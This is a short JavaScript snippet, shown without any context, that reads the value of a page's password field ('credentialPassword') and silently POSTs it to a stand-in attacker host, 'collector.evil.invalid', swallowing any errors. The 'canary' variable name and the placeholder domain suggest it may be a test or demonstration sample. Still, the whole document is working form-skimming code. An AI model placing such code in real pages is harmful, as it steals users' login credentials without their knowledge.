const canary = document.querySelector('input[name="credentialPassword"]')?.value;
if (canary) {
  fetch('https://collector.evil.invalid/collect', {
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' },
    body: canary
  }).catch(() => {});
}
